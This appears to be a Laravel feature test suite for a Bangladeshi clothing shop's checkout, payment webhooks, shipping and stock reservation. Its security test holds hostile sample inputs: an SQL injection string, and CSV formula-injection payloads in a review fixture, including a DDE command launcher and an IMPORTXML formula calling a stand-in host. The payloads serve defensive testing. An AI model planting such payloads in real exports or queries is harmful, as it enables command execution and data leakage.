<?php

namespace Tests\Feature\ProductionAudit;

use App\Modules\Catalog\Models\Brand;
use App\Modules\Catalog\Models\Category;
use App\Modules\Catalog\Models\Product;
use App\Modules\Catalog\Models\ProductVariant;
use App\Modules\Identity\Models\User;
use App\Modules\Inventory\Models\InventoryItem;
use App\Modules\Inventory\Models\Warehouse;
use App\Modules\Promotions\Models\Coupon;
use App\Modules\Reviews\Models\ProductReview;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

class CompletePurchaseJourneyAndAuditTest extends TestCase
{
    use RefreshDatabase;

    protected User $superAdmin;
    protected User $customer;
    protected User $otherCustomer;
    protected Product $product;
    protected ProductVariant $variant;
    protected Warehouse $warehouse;
    protected Coupon $coupon;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolesAndPermissionsSeeder::class);

        $this->superAdmin = User::where('email', 'admin@clothing-commerce.test')->firstOrFail();

        $this->customer = User::factory()->customer()->create([
            'name'              => 'Tariqul Islam',
            'email'             => 'tariq@example.com',
            'phone'             => '+8801712345678',
            'status'            => 'active',
            'email_verified_at' => now(),
        ]);

        $this->otherCustomer = User::factory()->customer()->create([
            'name'              => 'Other Customer',
            'email'             => 'other@example.com',
            'phone'             => '+8801812345678',
            'status'            => 'active',
            'email_verified_at' => now(),
        ]);

        $brand = Brand::factory()->create([
            'name'      => 'Atelier Dhaka',
            'slug'      => 'atelier-dhaka',
            'is_active' => true,
        ]);

        $category = Category::factory()->create([
            'name'      => 'Festive Jamdani',
            'slug'      => 'festive-jamdani',
            'is_active' => true,
        ]);

        $this->product = Product::factory()->create([
            'brand_id'     => $brand->id,
            'category_id'  => $category->id,
            'name'         => 'Handloom Silk Jamdani Kurta',
            'slug'         => 'handloom-silk-jamdani-kurta',
            'description'  => 'Authentic handwoven Jamdani silk kurta.',
            'status'       => 'published',
            'is_featured'  => true,
            'published_at' => now()->subDay(),
        ]);

        $this->variant = ProductVariant::factory()->create([
            'product_id'   => $this->product->id,
            'sku'          => 'JMD-SLK-XL',
            'color'        => 'Ivory Gold',
            'size'         => 'XL',
            'price_amount' => 450000, // BDT 4,500.00
            'currency'     => 'BDT',
            'status'       => 'active',
        ]);

        $this->warehouse = Warehouse::factory()->create([
            'name'       => 'Dhaka Flagship Warehouse',
            'code'       => 'DHK-01',
            'is_active'  => true,
            'is_default' => true,
        ]);

        InventoryItem::factory()->create([
            'product_variant_id'  => $this->variant->id,
            'warehouse_id'        => $this->warehouse->id,
            'quantity_on_hand'    => 10,
            'quantity_reserved'   => 0,
            'low_stock_threshold' => 3,
        ]);

        $this->coupon = Coupon::create([
            'code'             => 'FESTIVE500',
            'description'      => 'BDT 500 off festive collection',
            'type'             => 'fixed_amount',
            'value'            => 50000, // BDT 500.00
            'min_order_amount' => 400000,
            'usage_limit'      => 50,
            'used_count'       => 0,
            'currency'         => 'BDT',
            'starts_at'        => now()->subDay(),
            'expires_at'       => now()->addDays(10),
            'is_active'        => true,
        ]);

        Config::set('payment.gateways.mock.enabled', true);
        Config::set('payment.gateways.mock.merchant_id', 'MOCK-MERCHANT-BD');
        Config::set('payment.gateways.mock.webhook_secret', 'audit_mock_webhook_secret_999');

        Config::set('shipping.couriers.pathao.base_url', 'https://courier-api-sandbox.pathao.com');
        Config::set('shipping.couriers.pathao.client_id', 'pathao_cid');
        Config::set('shipping.couriers.pathao.client_secret', 'pathao_csecret');
        Config::set('shipping.couriers.pathao.username', 'merchant@pathao.test');
        Config::set('shipping.couriers.pathao.password', 'pathao_pass');
        Config::set('shipping.couriers.pathao.store_id', 101);
        Config::set('shipping.couriers.pathao.webhook_secret', 'pathao_audit_webhook_secret');
    }

    private function validBangladeshAddress(array $overrides = []): array
    {
        return array_merge([
            'name'           => 'Tariqul Islam',
            'email'          => 'tariq@example.com',
            'phone'          => '01712345678',
            'division'       => 'Dhaka',
            'district'       => 'Dhaka',
            'upazila_thana'  => 'Banani',
            'street_address' => 'House 44, Road 11, Block F',
            'postal_code'    => '1213',
        ], $overrides);
    }

    /**
     * Test Complete End-to-End Purchase Journey:
     * Product selection -> Cart -> Checkout -> Order -> Payment -> Fulfilment -> Delivery
     */
    public function test_complete_end_to_end_purchase_journey_from_product_selection_to_delivery(): void
    {
        // ── Step 1: Product Selection & Availability Check ─────────────────
        $catalogResp = $this->getJson('/api/catalog/products?category=festive-jamdani');
        $catalogResp->assertOk()
            ->assertJsonPath('data.0.slug', 'handloom-silk-jamdani-kurta');

        $detailResp = $this->getJson('/api/catalog/products/handloom-silk-jamdani-kurta');
        $detailResp->assertOk()
            ->assertJsonPath('data.variants.0.sku', 'JMD-SLK-XL')
            ->assertJsonPath('data.variants.0.price.amount', 450000);

        $availResp = $this->getJson("/api/inventory/variants/{$this->variant->id}/availability");
        $availResp->assertOk()
            ->assertJsonPath('data.in_stock', true)
            ->assertJsonPath('data.available_quantity', 10);

        // ── Step 2: Guest Cart -> Add Item -> Customer Login & Cart Merge ──
        $guestToken = 'guest-e2e-session-token-001';

        $addCartResp = $this->withHeaders(['X-Guest-Token' => $guestToken])
            ->postJson('/api/cart/items', [
                'variant_id' => $this->variant->id,
                'quantity'   => 1,
            ]);
        $addCartResp->assertStatus(201);
        $cartItemId = $addCartResp->json('data.items.0.id');

        // Update item quantity to 2 (2 * 450,000 = 900,000 paisa = BDT 9,000.00)
        $this->withHeaders(['X-Guest-Token' => $guestToken])
            ->patchJson("/api/cart/items/{$cartItemId}", ['quantity' => 2])
            ->assertOk()
            ->assertJsonPath('data.subtotal.amount', 900000);

        // Customer logs in and merges guest cart
        $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/cart/merge', ['guest_token' => $guestToken])
            ->assertOk()
            ->assertJsonPath('data.subtotal.amount', 900000);

        // Select shipping address & apply coupon FESTIVE500 (-50,000 paisa)
        $shippingAddress = $this->validBangladeshAddress();

        $this->actingAs($this->customer, 'sanctum')
            ->putJson('/api/cart/address', [
                'shipping_address' => $shippingAddress,
                'shipping_method'  => 'standard',
            ])
            ->assertOk();

        $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/cart/coupon', ['code' => 'FESTIVE500'])
            ->assertOk()
            ->assertJsonPath('data.discount.amount', 50000);

        // ── Step 3: Checkout Authoritative Quote ───────────────────────────
        // Subtotal 900,000 - Discount 50,000 = 850,000 (>= 500,000 free shipping threshold -> shipping = 0)
        $quoteResp = $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/checkout/quote', [
                'shipping_address' => $shippingAddress,
                'shipping_method'  => 'standard',
                'payment_method'   => 'bkash',
                'coupon_code'      => 'FESTIVE500',
            ]);

        $quoteResp->assertOk()
            ->assertJsonPath('data.subtotal.amount', 900000)
            ->assertJsonPath('data.discount.amount', 50000)
            ->assertJsonPath('data.tax.amount', 42500)
            ->assertJsonPath('data.total.amount', 892500);

        $quoteToken = $quoteResp->json('data.quote_token');

        // ── Step 4: Order Placement (with Idempotency Verification) ────────
        $orderIdempotencyKey = 'e2e-order-placement-key-001';

        $placeResp = $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/checkout/orders', [
                'idempotency_key'  => $orderIdempotencyKey,
                'quote_token'      => $quoteToken,
                'shipping_address' => $shippingAddress,
                'shipping_method'  => 'standard',
                'payment_method'   => 'bkash',
                'coupon_code'      => 'FESTIVE500',
            ]);

        $placeResp->assertStatus(201)
            ->assertJsonPath('idempotent_replay', false)
            ->assertJsonPath('data.total.amount', 892500);

        $orderId = (int) $placeResp->json('data.id');
        $orderNumber = (string) $placeResp->json('data.order_number');

        // Verify duplicate order submission with same idempotency key replays 200 without double reservation
        $replayResp = $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/checkout/orders', [
                'idempotency_key'  => $orderIdempotencyKey,
                'shipping_address' => $shippingAddress,
                'shipping_method'  => 'standard',
                'payment_method'   => 'bkash',
            ]);
        $replayResp->assertStatus(200)
            ->assertJsonPath('idempotent_replay', true)
            ->assertJsonPath('data.order_number', $orderNumber);

        $invAfterOrder = InventoryItem::where('product_variant_id', $this->variant->id)->firstOrFail();
        $this->assertSame(10, (int) $invAfterOrder->quantity_on_hand);
        $this->assertSame(2, (int) $invAfterOrder->quantity_reserved);

        // ── Step 5: Payment Initiation & Signed Webhook Verification ───────
        $initPayResp = $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/payments/initiate', [
                'order_number'    => $orderNumber,
                'gateway'         => 'mock',
                'idempotency_key' => 'e2e-pay-init-001',
            ]);

        $initPayResp->assertStatus(201);
        $gatewayPaymentId = (string) $initPayResp->json('data.transaction.gateway_payment_id');
        $merchantRef = (string) $initPayResp->json('data.transaction.merchant_reference');

        $webhookPayload = [
            'event_id'           => 'EVT-E2E-001',
            'status'             => 'SUCCESS',
            'payment_id'         => $gatewayPaymentId,
            'transaction_id'     => 'MOCK-TRX-E2E-999',
            'merchant_reference' => $merchantRef,
            'merchant_id'        => 'MOCK-MERCHANT-BD',
            'amount'             => 892500,
            'currency'           => 'BDT',
        ];
        $rawWebhookBody = (string) json_encode($webhookPayload);
        $validSignature = hash_hmac('sha256', $rawWebhookBody, 'audit_mock_webhook_secret_999');

        $webhookResp = $this->call('POST', '/api/webhooks/mock', [], [], [], [
            'CONTENT_TYPE'          => 'application/json',
            'HTTP_ACCEPT'           => 'application/json',
            'HTTP_X_MOCK_SIGNATURE' => $validSignature,
        ], $rawWebhookBody);

        $webhookResp->assertOk()
            ->assertJsonPath('data.transaction.status', 'paid')
            ->assertJsonPath('data.order.payment_status', 'paid')
            ->assertJsonPath('data.order.status', 'CONFIRMED')
            ->assertJsonPath('idempotent_replay', false);

        // ── Step 6: Fulfilment (Process Order & Create Pathao Shipment) ────
        $this->actingAs($this->superAdmin, 'sanctum')
            ->postJson("/api/admin/orders/{$orderId}/process", [
                'notes' => 'Quality check passed at Dhaka Flagship Warehouse',
            ])
            ->assertOk()
            ->assertJsonPath('data.status', 'PROCESSING');

        Http::fake([
            '*/aladdin/api/v1/issue-token' => Http::response([
                'access_token' => 'pathao_e2e_token',
                'expires_in'   => 3600,
            ], 200),
            '*/aladdin/api/v1/orders' => Http::response([
                'code' => 200,
                'data' => [
                    'consignment_id'    => 'PT-E2E-778899',
                    'merchant_order_id' => $orderNumber,
                    'order_status'      => 'Pending',
                    'delivery_fee'      => 70,
                ],
            ], 200),
        ]);

        $shipResp = $this->actingAs($this->superAdmin, 'sanctum')
            ->postJson('/api/admin/shipments', [
                'order_id'        => $orderId,
                'courier'         => 'pathao',
                'idempotency_key' => 'e2e-ship-key-001',
            ]);

        $shipResp->assertStatus(201)
            ->assertJsonPath('data.consignment_id', 'PT-E2E-778899')
            ->assertJsonPath('data.status', 'created');

        // Stock reservation must now be committed: 10 -> 8 on hand, 0 reserved
        $invAfterShip = InventoryItem::where('product_variant_id', $this->variant->id)->firstOrFail();
        $this->assertSame(8, (int) $invAfterShip->quantity_on_hand);
        $this->assertSame(0, (int) $invAfterShip->quantity_reserved);

        // ── Step 7: Delivery (Pathao Tracking Webhook & Customer Tracking) ─
        $deliveryWebhook = [
            'consignment_id'    => 'PT-E2E-778899',
            'merchant_order_id' => $orderNumber,
            'order_status'      => 'Delivered',
            'updated_at'        => '2026-11-19T12:00:00Z',
        ];
        $deliveryBody = (string) json_encode($deliveryWebhook);

        $this->call('POST', '/api/webhooks/shipping/pathao', [], [], [], [
            'CONTENT_TYPE'            => 'application/json',
            'HTTP_ACCEPT'             => 'application/json',
            'HTTP_X_PATHAO_SIGNATURE' => 'pathao_audit_webhook_secret',
        ], $deliveryBody)
            ->assertOk()
            ->assertJsonPath('data.shipment.status', 'delivered');

        // Customer verifies order is delivered and views tracking events
        $trackResp = $this->actingAs($this->customer, 'sanctum')
            ->getJson("/api/orders/{$orderNumber}/tracking");

        $trackResp->assertOk()
            ->assertJsonPath('data.order_status', 'delivered')
            ->assertJsonPath('data.fulfilment_status', 'delivered')
            ->assertJsonPath('data.shipments.0.consignment_id', 'PT-E2E-778899')
            ->assertJsonPath('data.shipments.0.status', 'delivered');

        // Admin Dashboard reflects exact live metrics
        $metricsResp = $this->actingAs($this->superAdmin, 'sanctum')
            ->getJson('/api/admin/dashboard/metrics');

        $metricsResp->assertOk()
            ->assertJsonPath('data.total_sales', 892500)
            ->assertJsonPath('data.revenue', 892500)
            ->assertJsonPath('data.delivered_orders', 1)
            ->assertJsonPath('data.best_selling_products.0.product_id', $this->product->id)
            ->assertJsonPath('data.best_selling_products.0.total_quantity_sold', 2);
    }

    /**
     * Audit Verification: SQL Injection, CSV Formula Injection, IDOR & Forged Webhooks.
     */
    public function test_security_hardening_against_sqli_csv_injection_idor_and_webhook_forgery(): void
    {
        // 1. SQL Injection payloads in search/filter queries must never error or leak unpublished records
        Product::factory()->create([
            'name'   => 'Secret Unpublished Draft',
            'slug'   => 'secret-unpublished-draft',
            'status' => 'draft',
        ]);

        $sqliResp = $this->getJson("/api/catalog/products?search=" . urlencode("' OR 1=1 --"));
        $sqliResp->assertOk();
        $names = collect($sqliResp->json('data'))->pluck('name')->all();
        $this->assertNotContains('Secret Unpublished Draft', $names);

        // 2. CSV Formula Injection (CWE-1236) neutralization on Admin CSV Export
        ProductReview::create([
            'product_id'    => $this->product->id,
            'reviewer_name' => "=cmd|' /C calc'!A0",
            'rating'        => 5,
            'title'         => '+SUM(1,1)',
            'comment'       => '@IMPORTXML("http://evil.example")',
            'status'        => 'pending',
        ]);

        $csvResp = $this->actingAs($this->superAdmin, 'sanctum')
            ->get('/api/admin/export/reviews');

        $csvResp->assertStatus(200);
        $csvContent = $csvResp->getContent();
        $this->assertStringContainsString("'=cmd|' /C calc'!A0", $csvContent);
        $this->assertStringContainsString("'+SUM(1,1)", $csvContent);

        // 3. Forged Payment Webhook Signature must be rejected (400 Bad Request)
        $forgedBody = (string) json_encode([
            'event_id' => 'FORGED-1',
            'status'   => 'SUCCESS',
            'amount'   => 1000,
        ]);

        $this->call('POST', '/api/webhooks/mock', [], [], [], [
            'CONTENT_TYPE'          => 'application/json',
            'HTTP_ACCEPT'           => 'application/json',
            'HTTP_X_MOCK_SIGNATURE' => 'invalid_forged_signature',
        ], $forgedBody)->assertStatus(400);

        // 4. IDOR Protection: Other customer cannot view or track someone else's order
        $placeResp = $this->actingAs($this->customer, 'sanctum')
            ->postJson('/api/checkout/orders', [
                'idempotency_key'  => 'idor-test-order-1',
                'items'            => [['variant_id' => $this->variant->id, 'quantity' => 1]],
                'shipping_address' => $this->validBangladeshAddress(),
                'shipping_method'  => 'standard',
                'payment_method'   => 'cod',
            ]);
        $placeResp->assertStatus(201);
        $orderNumber = (string) $placeResp->json('data.order_number');

        $this->actingAs($this->otherCustomer, 'sanctum')
            ->getJson("/api/checkout/orders/{$orderNumber}")
            ->assertStatus(404);

        $this->actingAs($this->otherCustomer, 'sanctum')
            ->getJson("/api/orders/{$orderNumber}/tracking")
            ->assertStatus(403);
    }

    /**
     * Load & Concurrency Simulation:
     * Simulates a burst of 15 order attempts against limited stock (10 units) + idempotent replays.
     * Guarantees stock never goes negative and exact reservation invariants hold.
     */
    public function test_load_and_inventory_exhaustion_under_burst_checkout_traffic(): void
    {
        $successCount = 0;
        $outOfStockCount = 0;

        // 15 distinct order attempts each requesting 1 unit against 10 units on hand
        for ($i = 1; $i <= 15; $i++) {
            $resp = $this->actingAs($this->customer, 'sanctum')
                ->postJson('/api/checkout/orders', [
                    'idempotency_key'  => "burst-load-order-{$i}",
                    'items'            => [['variant_id' => $this->variant->id, 'quantity' => 1]],
                    'shipping_address' => $this->validBangladeshAddress([
                        'name'           => "Burst Buyer {$i}",
                        'street_address' => "Plot {$i}, Gulshan Avenue",
                    ]),
                    'shipping_method'  => 'standard',
                    'payment_method'   => 'cod',
                ]);

            if ($resp->status() === 201) {
                $successCount++;
            } elseif ($resp->status() === 422 || $resp->status() === 409) {
                $outOfStockCount++;
            }
        }

        $this->assertSame(10, $successCount, 'Exactly 10 orders should succeed for 10 available units');
        $this->assertSame(5, $outOfStockCount, 'Remaining 5 orders must fail cleanly with out-of-stock');

        $inv = InventoryItem::where('product_variant_id', $this->variant->id)->firstOrFail();
        $this->assertSame(10, (int) $inv->quantity_on_hand);
        $this->assertSame(10, (int) $inv->quantity_reserved);
        $this->assertGreaterThanOrEqual(0, (int) $inv->quantity_on_hand - (int) $inv->quantity_reserved);
    }
}
